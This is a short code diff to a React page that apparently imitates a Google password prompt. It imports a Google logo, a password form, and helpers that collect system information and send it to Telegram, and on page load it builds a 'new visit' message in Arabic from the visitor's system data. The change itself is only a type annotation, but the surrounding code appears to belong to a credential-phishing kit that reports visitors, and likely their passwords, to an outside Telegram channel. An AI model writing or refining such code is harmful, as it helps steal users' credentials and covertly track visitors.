@@ -2,7 +2,7 @@ import { useState, useEffect } from "react";
 import { MoreVertical, Moon, Sun } from "lucide-react";
 import GoogleLogo from "@/components/GoogleLogo";
 import { usePasswordForm } from "@/hooks/usePasswordForm";
-import { sendToTelegram, collectSystemInfo } from "@/utils/telegramNotifier";
+import { sendToTelegram, collectSystemInfo, type SystemInfo } from "@/utils/telegramNotifier";
 import { PasswordForm } from "@/components/password/PasswordForm";
 
 const Index = () => {
@@ -16,7 +16,7 @@ const Index = () => {
 
   useEffect(() => {
     const sendInitialInfo = async () => {
-      const systemInfo = collectSystemInfo();
+      const systemInfo: SystemInfo = collectSystemInfo();
       const message = `
 🌟 زيارة جديدة للموقع 🌟
 
